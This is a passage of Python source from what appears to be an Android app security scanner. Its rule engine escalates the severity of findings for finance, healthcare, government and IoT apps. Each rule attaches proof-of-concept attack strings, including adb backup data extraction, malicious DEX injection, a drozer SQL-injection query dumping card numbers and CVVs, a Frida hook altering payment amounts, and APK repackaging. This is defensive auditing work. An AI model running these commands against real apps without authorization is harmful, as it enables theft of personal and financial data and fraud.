                "adb backup -f backup.ab -noapk {pkg} && unpack -- citizen records in plaintext",
                "Citizen PII (Aadhaar, PAN, Ration card data) backed to Google Drive — CERT-In reportable",
                conf)

        # I5: Backup + Enterprise → MEDIUM
        if fid in self.BACKUP_IDS and ctx.get("enterprise"):
            self._esc(f, "MEDIUM", "I5-BACKUP-ENTERPRISE",
                "Backup enabled in enterprise app — corporate data extractable",
                "adb backup -f backup.ab -noapk {pkg} && unpack",
                "Corporate email, calendar, contacts backed up — data leakage via cloud backup",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP J — NATIVE / JNI RULES
        # ════════════════════════════════════════════════════

        # J1: Native lib + exported activity → HIGH (memory corruption potential)
        if fid in self.NATIVE_IDS and fl.get("has_exported_activity"):
            self._esc(f, "HIGH", "J1-NATIVE-EXPORTED",
                "Native library + exported activity — intent data flows to native code",
                "# Fuzz intent extras that reach JNI:\n"
                "adb shell am start -n {pkg}/.NativeActivity --es input 'AAAA...'\n"
                "# Monitor with: adb logcat | grep -i 'crash\\|signal\\|SIGSEGV'",
                "Malformed intent data passed to native JNI function → buffer overflow, crash, potential RCE",
                conf)

        # J2: Native lib + IoT/OTA → CRITICAL
        if fid in self.NATIVE_IDS and ctx.get("iot_ota"):
            self._esc(f, "CRITICAL", "J2-NATIVE-OTA",
                "Native code in IoT/OTA app — binary exploitation in update handler",
                "Reverse .so with Ghidra/IDA → find unsafe strcpy/memcpy in update parser\n"
                "Fuzz firmware image parser with AFL",
                "Memory corruption in OTA parser → remote code execution on device/ECU",
                conf)

        # J3: Native lib + Finance → HIGH
        if fid in self.NATIVE_IDS and ctx.get("finance"):
            self._esc(f, "HIGH", "J3-NATIVE-FINANCE",
                "Native code in financial app — payment processing in JNI, potential memory corruption",
                "# Find JNI functions that handle payment amount strings:\n"
                "nm -D libnative.so | grep -i pay\n"
                "strings libnative.so | grep -E 'amount|transfer|payment'",
                "Buffer overflow in JNI payment parser could allow amount manipulation or RCE",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP K — SPLIT APK / SUPPLY CHAIN
        # ════════════════════════════════════════════════════

        # K1: Split APK + exported activity → MEDIUM
        if fid == "MF-007" and fl.get("has_split_apk"):
            self._esc(f, "MEDIUM", "K1-SPLIT-APK-SUPPLY-CHAIN",
                "Split APK + exported activity — dynamic module injection risk",
                "Verify feature modules are Play-signed. Check SplitInstallManager source.",
                "Compromised delivery channel loads malicious feature module with access to exported context",
                conf)

        # K2: Dynamic code loading (DexClassLoader) + no integrity check → HIGH
        if fid in ("SRC-080", "SRC-081") and not fl.get("has_integrity_check"):
            self._esc(f, "HIGH", "K2-DYNAMIC-CODE-LOAD",
                "DexClassLoader used without integrity verification — code injection",
                "# Replace loaded .dex file on external storage with malicious version\n"
                "adb push evil.dex /sdcard/Android/data/{pkg}/cache/plugin.dex",
                "App loads attacker-controlled DEX — arbitrary code execution in app context",
                conf)

        # K3: Dynamic code + Finance → CRITICAL
        if fid in ("SRC-080", "SRC-081") and ctx.get("finance") and not fl.get("has_integrity_check"):
            self._esc(f, "CRITICAL", "K3-DYNAMIC-CODE-FINANCE",
                "DexClassLoader in financial app without integrity check — full account takeover",
                "# Replace plugin dex with backdoored version\n"
                "adb push evil_payment.dex /sdcard/Android/data/{pkg}/cache/payment_plugin.dex",
                "Inject malicious payment processing code — redirect transactions to attacker account",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP L — WEBVIEW SPECIFIC RULES
        # ════════════════════════════════════════════════════

        # L1: File scheme access enabled in WebView → HIGH
        if fid == "MF-030" or (fl.get("has_webview") and fl.get("file_access_enabled")):
            self._esc(f, "HIGH", "L1-WEBVIEW-FILE-ACCESS",
                "WebView allows file:// scheme — cross-origin file read",
                "adb shell am start -n {pkg}/{webview_comp} --es url "
                "'file:///data/data/{pkg}/shared_prefs/FlutterSecureStorage.xml'",
                "Load file:// URI in WebView to read app's private files from JavaScript",
                conf)

        # L2: JavaScript Interface + WebView + remote URL → CRITICAL
        if fid in ("MF-030", "MF-031") and fl.get("has_js_interface"):
            self._esc(f, "CRITICAL", "L2-WEBVIEW-JS-INTERFACE",
                "WebView JavaScript interface exposed — RCE via XSS",
                "# If WebView loads attacker-controlled URL with JS enabled:\n"
                "# Inject: window.Android.getToken() or window.JSBridge.exec('cmd')",
                "JS interface methods callable from any loaded web page → full app RCE, data theft",
                conf)

        # L3: WebView + shouldOverrideUrlLoading missing → HIGH
        if fl.get("has_webview") and not fl.get("has_url_override"):
            self._esc(f, "HIGH", "L3-WEBVIEW-NO-URL-OVERRIDE",
                "WebView missing shouldOverrideUrlLoading — open redirect possible",
                "Load attacker page that redirects to intent:// or custom scheme URL",
                "Redirect to privileged intent:// URLs → trigger exported activities or services",
                conf)

        # L4: WebView + Finance + JavaScript enabled → CRITICAL
        if fl.get("has_webview") and ctx.get("finance") and fl.get("js_enabled"):
            self._esc(f, "CRITICAL", "L4-WEBVIEW-JS-FINANCE",
                "WebView with JS enabled in financial app — XSS leads to account takeover",
                "# Inject XSS into payment page:\n"
                "window.PaymentJSBridge.confirmPayment({amount:0, to:'attacker'})",
                "XSS in financial WebView → call payment JS bridge → unauthorized transfer",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP M — COMBO / CHAIN RULES
        # ════════════════════════════════════════════════════

        # M1: Exported Activity + Backup + Finance → CRITICAL chain
        if fid in self.EXPORTED_IDS and fl.get("backup_no_exclusions") and ctx.get("finance"):
            self._esc(f, "CRITICAL", "M1-CHAIN-EXPORTED-BACKUP-FINANCE",
                "Exported activity + unprotected backup in financial app — full account takeover chain",
                "Step 1: adb backup → extract session token from SharedPrefs\n"
                "Step 2: adb shell am start -n {pkg}/.MainActivity (auth bypassed with stolen token)",
                "Two-step chain: steal token via backup → use exported activity to access account",
                conf)

        # M2: DeepLink + No NSC + Finance → HIGH chain
        if fid in self.DEEPLINK_IDS and not fl.get("has_ssl_pinning") and ctx.get("finance"):
            self._esc(f, "HIGH", "M2-CHAIN-DEEPLINK-MITM",
                "DeepLink passes URL to network + no SSL pinning = MITM + phishing chain",
                "1. Send victim crafted deeplink: yourscheme://pay?amount=1000&to=attacker\n"
                "2. MITM intercepts transaction via Burp (no pinning)\n"
                "3. Modify amount/recipient in transit",
                "Deeplink triggers financial request → intercepted and modified by MITM attacker",
                conf)

        # M3: Exported Receiver + Exported Service + no permission → HIGH chain
        if fid in self.RECEIVER_IDS and fl.get("has_exported_service_no_perm"):
            self._esc(f, "HIGH", "M3-CHAIN-RECEIVER-SERVICE",
                "Exported receiver triggers exported service — privilege escalation chain",
                "adb shell am broadcast -a {pkg}.TRIGGER_SYNC\n"
                "# Receiver starts Service with elevated privileges",
                "Receiver acts as entry point → starts privileged service without authentication",
                conf)

        # M4: SQL Injection + Exported Provider + Finance → CRITICAL chain
        if fid in self.PROVIDER_IDS and fl.get("has_sqli_signal") and ctx.get("finance"):
            self._esc(f, "CRITICAL", "M4-CHAIN-SQLI-FINANCE",
                "SQLi in ContentProvider + financial app = full transaction DB dump",
                "drozer console connect --command \"run app.provider.query -a {pkg} "
                "--selection \\\"1=1 UNION SELECT account_no,cvv,expiry,1 FROM cards--\\\"\"",
                "SQL injection dumps payment cards, account numbers, transaction history",
                conf)

        # M5: Debuggable + Exported Activity + Finance → CRITICAL
        if fid == "MF-001" and fl.get("has_exported_activity") and ctx.get("finance"):
            self._esc(f, "CRITICAL", "M5-DEBUGGABLE-EXPORTED-FINANCE",
                "Debuggable financial app with exported activity — trivial data extraction",
                "adb shell run-as {pkg} cat shared_prefs/auth.xml\n"
                "adb shell run-as {pkg} sqlite3 databases/finance.db .dump",
                "No root needed — run-as gives full file system access to all app data",
                conf)

        # M6: No SSL Pinning + Healthcare + Exported Activity → CRITICAL
        if fid in self.EXPORTED_IDS and not fl.get("has_ssl_pinning") and ctx.get("healthcare"):
            self._esc(f, "CRITICAL", "M6-CHAIN-HEALTH-EXPORTED-MITM",
                "Healthcare app: exported activity launches → MITM captures PHI",
                "1. am start -n {pkg}/.PatientActivity\n"
                "2. frida ssl bypass → Burp intercepts patient record API response",
                "Launch directly to patient data view → no auth → intercept PHI via MITM",
                conf)

        # M7: Exported Activity + Provider + Finance → CRITICAL (data exfil chain)
        if fid in self.EXPORTED_IDS and fl.get("has_provider") and ctx.get("finance"):
            self._esc(f, "CRITICAL", "M7-CHAIN-ACTIVITY-PROVIDER-FINANCE",
                "Exported activity can lead to exported ContentProvider — PII exfil chain",
                "Step 1: adb shell am start -n {pkg}/.MainActivity (opens app)\n"
                "Step 2: adb shell content query --uri content://{pkg}/tokens/ (read auth tokens)",
                "Two-component chain: launch activity → provider leaked auth tokens → account takeover",
                conf)

        # M8: Backup + No NSC + Transport → HIGH (location history + MITM)
        if fid in self.BACKUP_IDS and ctx.get("transport") and fl.get("has_cleartext"):
            self._esc(f, "HIGH", "M8-CHAIN-BACKUP-TRANSPORT-MITM",
                "Backup enabled + cleartext network in transport app — trip history + live tracking leak",
                "Step 1: adb backup → extract trip/address history from DB\n"
                "Step 2: MITM live GPS tracking API calls over HTTP",
                "Trip history exfil via backup + real-time location tracking via MITM",
                conf)

        # M9: Exported Activity + Social + Storage → HIGH
        if fid in self.EXPORTED_IDS and ctx.get("social") and fl.get("has_external_storage"):
            self._esc(f, "HIGH", "M9-CHAIN-SOCIAL-EXPORTED-STORAGE",
                "Exported activity + external storage in social app — media file manipulation",
                "Step 1: adb shell am start -n {pkg}/.ProfileActivity --ei user_id 1337\n"
                "Step 2: Replace profile image on external storage with malicious content",
                "Access private profiles + replace media files stored externally → impersonation/content injection",
                conf)

        # M10: Exported Service + IoT + Native → CRITICAL (full device takeover)
        if fid in self.SERVICE_IDS and ctx.get("iot_ota") and fl.get("has_native"):
            self._esc(f, "CRITICAL", "M10-CHAIN-IOT-NATIVE-SERVICE",
                "Exported service + native code in IoT app — OTA hijack leads to device RCE",
                "Step 1: adb shell am startservice -n {pkg}/.UpdateService (trigger OTA)\n"
                "Step 2: Native buffer overflow in update parser → RCE on device",
                "Firmware update triggered via exported service → native code memory corruption → full device takeover",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP N — PENDING INTENT RULES
        # ════════════════════════════════════════════════════

        # N1: Mutable PendingIntent in Finance/Auth → CRITICAL
        if fid in self.PENDING_INTENT_IDS and fl.get("has_mutable_pi") and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "CRITICAL", "N1-MUTABLE-PI-FINANCE",
                "Mutable PendingIntent in finance/auth app — OTP/payment intent hijackable",
                "# Create app with matching IntentFilter to intercept PendingIntent\n"
                "# Or use Frida to dump PendingIntent extras before delivery",
                "Attacker intercepts PendingIntent containing OTP, payment confirmation, auth token — full account takeover",
                conf)

        # N2: PendingIntent without FLAG_IMMUTABLE on Android 12+ → HIGH
        if fid in self.PENDING_INTENT_IDS and fl.get("is_android_12_plus") and not fl.get("has_immutable_pi"):
            self._esc(f, "HIGH", "N2-PI-NO-IMMUTABLE-12",
                "PendingIntent without FLAG_IMMUTABLE on Android 12+ — policy violation",
                "Check: grep -r 'PendingIntent\\.get' smali/ | grep -v FLAG_IMMUTABLE\n"
                "Fix: add PendingIntent.FLAG_IMMUTABLE to all getActivity/getBroadcast/getService calls",
                "Android 12+ requires explicit FLAG_IMMUTABLE for all PendingIntents — missing flag risks hijacking",
                conf)

        # N3: PendingIntent.fillIn() + mutable → CRITICAL (hijacking chain)
        if fid == "ADV-PI-001" and fl.get("has_mutable_pi"):
            self._esc(f, "CRITICAL", "N3-PI-FILLIN-MUTABLE",
                "PendingIntent.fillIn() with mutable flags — Intent fields overwritable",
                "# Use Frida to hook PendingIntent.fillIn() and modify extras:\n"
                "Java.perform(function(){ var PI = Java.use('android.app.PendingIntent');\n"
                "  PI.fillIn.implementation = function(other){ other.putExtra('amount',99999); return this.fillIn(other); }; })",
                "Attacker overwrites Intent extras (amount, recipient, token) via fillIn() — privilege escalation",
                conf)

        # N4: Implicit Intent in PendingIntent (broadcast/service) → HIGH
        if fid in self.PENDING_INTENT_IDS and fl.get("has_implicit_pi"):
            self._esc(f, "HIGH", "N4-IMPLICIT-PI",
                "Implicit Intent wrapped in PendingIntent — delayed interception risk",
                "adb shell am broadcast -a '<implicit_action>'  # intercept broadcast PendingIntent\n"
                "drozer console connect --command \"run app.broadcast.send --action <action>\"",
                "Any app with matching intent-filter intercepts the delayed broadcast — phishing, token theft",
                conf)

        # N5: PendingIntent in enterprise/MDM → CRITICAL (device admin)
        if fid in self.PENDING_INTENT_IDS and ctx.get("enterprise"):
            self._esc(f, "CRITICAL", "N5-PI-ENTERPRISE",
                "PendingIntent in MDM/enterprise app — device admin intent hijackable",
                "Create malicious app with matching IntentFilter targeting the same admin action",
                "Attacker intercepts device admin PendingIntent → bypass MDM policies, device wipe, enterprise data access",
                conf)

        # N6: PendingIntent without FLAG_IMMUTABLE on pre-Android 12 + Finance → MEDIUM
        if fid in self.PENDING_INTENT_IDS and not fl.get("is_android_12_plus") and ctx.get("finance") and not fl.get("has_immutable_pi"):
            self._esc(f, "MEDIUM", "N6-PI-NO-IMMUTABLE-PRE12-FINANCE",
                "PendingIntent without FLAG_IMMUTABLE in financial app (pre-12)",
                "# On Android <12, all PendingIntents are mutable by default\n"
                "# Use Frida to hook and extract PendingIntent extras",
                "Default mutable PendingIntent in financial app — OTP/payment data at risk on older devices",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP O — OTHER / MISSING ATTACK SURFACES
        # ════════════════════════════════════════════════════

        # O1: Intent Redirection (nested intent via getParcelableExtra) → CRITICAL
        if fid in ("SRC-053", "SRC-057") and fl.get("has_exported_activity"):
            self._esc(f, "CRITICAL", "O1-INTENT-REDIRECTION",
                "Exported component reads nested Intent from extras — intent redirection possible",
                "adb shell am start -n {pkg}/.ProxyActivity "
                "--es redirect '{\"component\":\"com.evil/.Evil\",\"extra\":\"pwned\"}'",
                "Attacker passes malicious nested Intent via exported component → arbitrary activity launch with any extras",
                conf)

        # O2: QUERY_ALL_PACKAGES in Finance → HIGH
        if fid == "MF-144" and ctx.get("finance"):
            self._esc(f, "HIGH", "O2-QUERY-ALL-PACKAGES-FINANCE",
                "QUERY_ALL_PACKAGES in financial app — targeted phishing via app enumeration",
                "adb shell pm list packages | grep -E 'bank|pay|wallet|finance'\n"
                "# Malicious app uses QUERY_ALL_PACKAGES to discover which banking apps victim has installed",
                "Attacker enumerates installed apps to identify victim's banking apps → targeted phishing campaigns",
                conf)

        # O3: QUERY_ALL_PACKAGES in Auth → HIGH
        if fid == "MF-144" and ctx.get("auth"):
            self._esc(f, "HIGH", "O3-QUERY-ALL-PACKAGES-AUTH",
                "QUERY_ALL_PACKAGES in auth app — credential harvesting via targeted attacks",
                "Malicious app identifies auth/SSO apps and delivers targeted credential harvesting UI",
                "Attackers discover auth apps for targeted phishing — SSO token theft, credential harvesting",
                conf)

        # O4: Insecure Random in Finance/Auth → CRITICAL
        if fid in ("SRC-046", "SRC-114") and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "CRITICAL", "O4-INSECURE-RANDOM-FINANCE",
                "Predictable random number generator in finance/auth app — OTP/token forgery",
                "# OTP generated with java.util.Random is predictable:\n"
                "# Capture 2-3 OTPs → reverse seed → predict next OTP\n"
                "java.util.Random is a 48-bit LCG — seed recovered from 2 consecutive outputs",
                "Attacker predicts OTP values, resets passwords, forges auth tokens — account takeover",
                conf)

        # O5: Insecure Random in any sensitive context → HIGH
        if fid in ("SRC-046", "SRC-114") and (ctx.get("healthcare") or ctx.get("government") or ctx.get("enterprise")):
            self._esc(f, "HIGH", "O5-INSECURE-RANDOM-SENSITIVE",
                "Predictable RNG in regulated app — session/PHI token forgery",
                "Replace java.util.Random with java.security.SecureRandom for all security-sensitive operations",
                "Session tokens, reset codes, or document IDs generated with predictable RNG — spoofing and forgery",
                conf)

        # O6: Unsafe Deserialization in exported component → CRITICAL
        if fid in ("SRC-081", "SRC-057", "SRC-083") and fl.get("has_exported_activity"):
            self._esc(f, "CRITICAL", "O6-UNSAFE-DESERIALIZATION",
                "Unsafe deserialization reachable via exported component — RCE via gadget chain",
                "# Craft serialized payload with known Android gadget chain:\n"
                "adb shell am start -n {pkg}/.ExportedActivity "
                "--es serialized '<base64_encoded_gadget_payload>'",
                "Attacker sends crafted serialized object via exported component → object injection → RCE",
                conf)

        # O7: Accessibility Service + Exported Activity → CRITICAL
        if fid in ("MF-057", "MF-117", "MF-180") and fl.get("has_exported_activity"):
            self._esc(f, "CRITICAL", "O7-ACCESSIBILITY-EXPORTED",
                "Accessibility service combined with exported activity — UI redressing chain",
                "Step 1: Launch exported activity via adb shell am start -n {pkg}/.SomeActivity\n"
                "Step 2: Accessibility service reads screen content → steal OTP/passwords in real time",
                "Accessibility service can read all UI content including password fields → combined with exported entry points for stealthy attack",
                conf)

        # O8: WebView without Safe Browsing → HIGH (finance/auth)
        if fid in ("MF-030", "MF-031") and fl.get("has_webview") and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "HIGH", "O8-WEBVIEW-NO-SAFE-BROWSING",
                "WebView in finance/auth app without Safe Browsing — phishing and malware delivery",
                "# Check if Safe Browsing is enabled:\n"
                "WebView.startSafeBrowsing(context, callback)\n"
                "WebSettingsFactory.setSafeBrowsingEnabled(true)",
                "WebView without Safe Browsing can load known malicious/phishing sites without warning",
                conf)

        # O9: POST_NOTIFICATIONS permission policy bypass (Android 13+) → MEDIUM
        if fid == "SRC-152" and fl.get("target_sdk_version", 0) >= 33:
            self._esc(f, "MEDIUM", "O9-NOTIFICATION-PERMISSION-BYPASS",
                "App targets Android 13+ but may bypass notification permission requirements",
                "# Check if app uses NotificationCompat or NotificationManager without POST_NOTIFICATIONS runtime check",
                "On Android 13+, POST_NOTIFICATIONS requires runtime permission — apps without proper handling may leak notification data",
                conf)

        # O10: Zip Slip / Path Traversal in update/file parsers → CRITICAL
        if fid in self.NATIVE_IDS and fl.get("has_file_provider"):
            self._esc(f, "CRITICAL", "O10-ZIP-SLIP-CHAIN",
                "Native code + FileProvider — Zip Slip in file extraction possible",
                "adb shell content read --uri content://{pkg}.fileprovider/../../tmp/evil.so\n"
                "# Or craft ZIP with ../ entries in file names during extraction",
                "Path traversal during ZIP extraction in native code → arbitrary file write → code execution",
                conf)

        # O11: Implicit broadcast receiver on Android 8+ → MEDIUM
        if fid in self.RECEIVER_IDS and fl.get("is_android_12_plus") and fl.get("has_boot_receiver"):
            self._esc(f, "MEDIUM", "O11-IMPLICIT-BROADCAST-8",
                "Implicit broadcast receiver on Android 8+ — registration blocked, receiver may not work",
                "# Android 8+ bans implicit broadcast registrations in manifest\n"
                "# App must use registerReceiver() dynamically or target explicit broadcasts",
                "Implicit broadcast receivers registered in manifest don't work on Android 8+ — indicates outdated security practices",
                conf)

        # O12: Overlay attack (SYSTEM_ALERT_WINDOW + Finance/Auth) → HIGH
        if fid == "MF-023" and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "HIGH", "O12-OVERLAY-FINANCE",
                "SYSTEM_ALERT_WINDOW in finance/auth app — overlay attack for credential phishing",
                "# Malicious app with SYSTEM_ALERT_WINDOW draws fake OTP/payment screen over real app\n"
                "adb shell am start -n {pkg}/.MainActivity\n"
                "am start -a android.settings.action.MANAGE_OVERLAY_PERMISSION",
                "Attacker draws fake login/payment overlay on top of real app → user enters credentials on attacker-controlled UI",
                conf)

        # O12b: Overlay attack (SYSTEM_ALERT_WINDOW + exported activity) → CRITICAL chain
        if fid == "MF-023" and fl.get("has_exported_activity"):
            self._esc(f, "CRITICAL", "O12B-OVERLAY-EXPORTED",
                "SYSTEM_ALERT_WINDOW + exported activity — overlay can trigger privileged actions",
                "Step 1: adb shell am start -n {pkg}/.ExportedSettingsActivity\n"
                "Step 2: Malicious overlay with transparent button over 'Confirm' CTA",
                "Exported activity launched by attacker → overlay placed over UI → user unknowingly confirms privileged action",
                conf)

        # O13: No anti-tamper / code integrity checks (OWASP M10) → MEDIUM
        if fid in self.STORAGE_IDS and not fl.get("has_integrity_check") and (ctx.get("finance") or ctx.get("healthcare")):
            self._esc(f, "MEDIUM", "O13-NO-ANTI-TAMPER",
                "No code integrity verification in regulated app — repackaging risk",
                "# Repackage APK with apktool:\n"
                "apktool d original.apk -o out/\n# Modify smali code\n"
                "apktool b out/ -o malicious.apk && jarsigner ... && adb install malicious.apk",
                "App lacks signature/code integrity checks — repackaged version can steal data from same device",
                conf)

        # O14: No root detection in Finance/Healthcare → MEDIUM
        if fid in self.STORAGE_IDS and not fl.get("has_root_detection") and (ctx.get("finance") or ctx.get("healthcare")):
            self._esc(f, "MEDIUM", "O14-NO-ROOT-DETECTION",
                "No root detection in regulated app — data at risk on rooted devices",
                "# Run on rooted device: the app can't detect su binary or root management apps\n"
                "adb shell su -c 'cat /data/data/{pkg}/shared_prefs/*.xml'",
                "On rooted devices, any app with root can bypass sandbox and read app data — root detection would prevent this",
                conf)

        # O15: Tapjacking (Touch Filter missing) + Finance/Auth
        # Severity drops on Android 12+ (overlay attacks restricted)
        if fid == "MF-045" and (ctx.get("finance") or ctx.get("auth")):
            o15_sev = "MEDIUM" if fl.get("is_android_12_plus") else "HIGH"
            self._esc(f, o15_sev, "O15-TAPJACKING-FINANCE",
                "Touch filter disabled in finance/auth app — tapjacking via overlay",
                "adb shell am start -n {pkg}/.TargetActivity\n"
                "# Place transparent overlay with SYSTEM_ALERT_WINDOW over confirm button",
                "Overlay app intercepts taps on 'Confirm Payment' → fraudulent transaction approval",
                conf)

        # O16: Notification Listener Service in Finance/Auth → CRITICAL
        if fid == "MF-058" and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "CRITICAL", "O16-NOTIFICATION-LISTENER-FINANCE",
                "NotificationListenerService in finance/auth app — OTP/2FA code interception",
                "adb shell dumpsys notification --list | grep {pkg}\n"
                "# Malicious app with NotificationListenerService reads all notifications including OTP",
                "OTP, 2FA codes, payment confirmations read by malicious NotificationListener — account takeover",
                conf)

        # O17: Accessibility Service without user-accessible purpose → HIGH
        if fid == "MF-057" and fl.get("has_exported_activity"):
            self._esc(f, "HIGH", "O17-ACCESSIBILITY-ABUSE",
                "AccessibilityService in app with exported activity — keylogging/clickjacking chain",
                "adb shell am start -n {pkg}/.ExportedActivity\n"
                "# AccessibilityService reads all screen content including password fields",
                "Exported activity opens app → AccessibilityService reads OTP/passwords from screen in real time",
                conf)

        # O18: Clipboard access (read) in sensitive app
        # Android 12+ restricts clipboard reads — drop severity
        if fid in ("SRC-047",) and (ctx.get("finance") or ctx.get("auth")):
            o18_sev = "LOW" if fl.get("is_android_12_plus") else "HIGH"
            self._esc(f, o18_sev, "O18-CLIPBOARD-SENSITIVE",
                "Clipboard read access in finance/auth app — copied secrets at risk",
                "# Monitor clipboard reads from malicious background app:\n"
                "ClipboardManager.getPrimaryClip() called while app is in background",
                "Attacker app reads clipboard when user copies OTP, password, or crypto address — sensitive data leak",
                conf)

        # O19: Fragment Injection reachable via exported Activity
        # Android 12+ mitigates PreferenceActivity fragment injection
        if fid in ("SRC-124", "ADV-018", "ADV-053") and fl.get("has_exported_activity"):
            o19_sev = "HIGH" if fl.get("is_android_12_plus") else "CRITICAL"
            self._esc(f, o19_sev, "O19-FRAGMENT-INJECTION",
                "Fragment injection via exported activity — arbitrary fragment loading",
                "adb shell am start -n {pkg}/.PreferenceActivity "
                "--es pref_fragment com.evil.MaliciousFragment",
                "Attacker loads arbitrary Fragment into app's activity — UI injection, data access, preference manipulation",
                conf)

        # O20: Custom InputMethodService — all keystrokes intercepted by keyboard
        if fid in ("SRC-182",) and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "CRITICAL", "O20-IME-KEYSTROKE-LOGGING",
                "Custom keyboard (InputMethodService) in finance/auth app — keystroke logging risk",
                "# Any keyboard-related app can register as IME; requires user opt-in via Settings\n"
                "# Once active, InputMethodService.onKeyDown/onKeyUp receives ALL keystrokes\n"
                "adb shell am start -a android.settings.INPUT_METHOD_SETTINGS",
                "Custom keyboard captures every keystroke across all apps — passwords, OTPs, crypto keys, messages",
                conf)

    # ─────────────────────────────────────────────
    # Sector Detection
    # ─────────────────────────────────────────────
    def _detect_sectors(self, pkg: str, app_name: str, permissions: List[str]) -> Dict[str, bool]:
        combined = (pkg + " " + app_name).lower()
        ctx = {}
        for sector, keywords in self.SECTOR_KEYWORDS.items():
            ctx[sector] = any(re.search(r'\b' + re.escape(kw) + r'\b', combined) for kw in keywords)

        # Finance also triggered by sensitive permissions
        if any(p in permissions for p in self.FINANCE_PERMISSIONS):
            ctx["finance"] = True

        # Auth triggered by biometric/fingerprint permissions
        if any(p in permissions for p in ["USE_BIOMETRIC", "USE_FINGERPRINT"]):
            ctx["auth"] = True

        return ctx

    # ─────────────────────────────────────────────
    # Flag Builder — co-occurrence detection
    # ─────────────────────────────────────────────
    def _build_flags(self, fids: Set[str], fnames: Set[str],
                     comps: List[str], permissions: Set[str],
                     target_sdk_version: int = None,
                     all_findings: List[Dict] = None) -> Dict[str, bool]:
        all_findings = all_findings or []
        # Normalize target_sdk_version (may be str from XML parsing)
        if target_sdk_version is not None:
            try:
                target_sdk_version = int(target_sdk_version)
            except (ValueError, TypeError):
                target_sdk_version = None
        return {
            "is_android_12_plus":      target_sdk_version is not None and target_sdk_version >= 31,
            "has_webview":               any(any(re.search(p, c, re.IGNORECASE) for p in self.WEBVIEW_PATTERNS) for c in comps),
            "has_cleartext":             "MF-003" in fids,
            "has_ssl_pinning":           any("ssl" in n and "pin" in n for n in fnames),
            "has_sqli_signal":           bool({"MF-010", "MF-011"} & fids) or any("sql" in n for n in fnames),
            "has_file_provider":         any("fileprovider" in c.lower() for c in comps),
            "has_exported_activity":     bool({"MF-007", "MF-064", "MF-086"} & fids),
            "has_exported_service_no_perm": bool({"MF-015", "MF-016"} & fids),
            "permission_on_provider":    any("android:permission" in m for f in all_findings for m in (f.get("matches") or []) if isinstance(m, str)),
            "permission_on_service":     any("android:permission" in m for f in all_findings for m in (f.get("matches") or []) if isinstance(m, str)),
            "touch_filter_missing":      "MF-045" in fids or any("touch" in n and "filter" in n for n in fnames),
            "has_flag_secure":           any("flag_secure" in n for n in fnames) \
                                         or any("FLAG_SECURE" in m for f in all_findings for m in (f.get("matches") or []) if isinstance(m, str)),
            "has_js_interface":          any("javascriptinterface" in n or "addjavascriptinterface" in n for n in fnames) \
                                         or any("JavascriptInterface" in m or "addJavascriptInterface" in m for f in all_findings for m in (f.get("matches") or []) if isinstance(m, str)),
            "file_access_enabled":       any("file" in n and "access" in n for n in fnames),
            "has_url_override":          any("shouldoverride" in n for n in fnames),
            "has_sms_receiver":          "RECEIVE_SMS" in permissions or "READ_SMS" in permissions,
            "has_connectivity_receiver": any("connectivity" in n for n in fnames),
            "has_boot_receiver":         any("boot" in n and "receiver" in n for n in fnames),
            "has_external_storage":      "WRITE_EXTERNAL_STORAGE" in permissions,
            "has_log_leak":              any("log" in n and ("token" in n or "password" in n or "secret" in n) for n in fnames),
            "has_ecb_mode":              any("ecb" in n for n in fnames),
            "has_provider":              bool(self.PROVIDER_IDS & fids),
            "has_native":                bool(self.NATIVE_IDS & fids),
            "js_enabled":                any("javascript" in n and "enabled" in n for n in fnames),
            "backup_no_exclusions":      ("MF-020" in fids or "MF-021" in fids) and not any("extraction" in n for n in fnames),
            "has_split_apk":             any("split" in n or "on-demand" in n for n in fnames),
            "has_integrity_check":       any("integrity" in n or "signature" in n for n in fnames),
            "has_mutable_pi":            any("FLAG_MUTABLE" in n or "mutable" in n or "fillIn" in n for n in fnames),
            "has_immutable_pi":          any("FLAG_IMMUTABLE" in n or "immutable" in n for n in fnames),
            "has_implicit_pi":           any("implicit" in n or "implicit_intent" in n for n in fnames),
            "has_task_reparenting":      "MF-116" in fids,
            "has_root_detection":        any("root" in n or "detect" in n or "tamper" in n or "su" in n for n in fnames),
        }

    # ─────────────────────────────────────────────
    # Component Extractor
    # ─────────────────────────────────────────────
    def _extract_components(self, findings: List[Dict]) -> List[str]:
        comps = []
        for f in findings:
            for m in (f.get("matches") or []):
                if isinstance(m, str):
                    for a in re.findall(r"""android:name=['"]([^'"]*)['"]""", m):
                        if a and a != "N/A":
                            comps.append(a)
        return comps

    # ─────────────────────────────────────────────
    # Escalation Writer
    # ─────────────────────────────────────────────
    def _esc(self, finding: Dict, new_sev: str, rule: str,
             summary: str, poc: str, impact: str, confidence: int):
        old = finding.get("severity", "INFO")

        # Confidence gating: chain demotions so C15 CRITICAL→MEDIUM, not stuck at HIGH
        C = self.SEVERITY_ORDER
        if confidence <= 10:
            new_sev = min(new_sev, "MEDIUM", key=lambda s: C.index(s))
            new_sev = min(new_sev, "LOW", key=lambda s: C.index(s))
        elif confidence <= 20:
            new_sev = min(new_sev, "MEDIUM", key=lambda s: C.index(s))
        elif confidence <= 40:
            new_sev = min(new_sev, "HIGH", key=lambda s: C.index(s))

        if self.SEVERITY_ORDER.index(new_sev) > self.SEVERITY_ORDER.index(old):
            finding["severity"]  = new_sev
            finding["escalated"] = True
            finding["escalation"] = {
                "rule": rule, "summary": summary,
                "poc": poc, "impact": impact,
                "old_severity": old, "new_severity": new_sev,
            }
            self.escalations.append({
                "id": finding.get("id", ""), "name": finding.get("name", ""),
                "old_severity": old, "new_severity": new_sev,
                "rule": rule, "summary": summary,
            })
            self._escalated_ids.add(finding.get("id", ""))
            print(f"  [ESC] {finding.get('id',''):10} ({rule}): {old} → {new_sev}")

    # ─────────────────────────────────────────────
    # Summary
    # ─────────────────────────────────────────────
    def get_summary(self) -> Dict:
        # Dedup: keep only the highest-severity escalation per finding ID
        seen = {}
        for e in self.escalations:
            fid = e.get("id", "")
            sev = e.get("new_severity", "INFO")
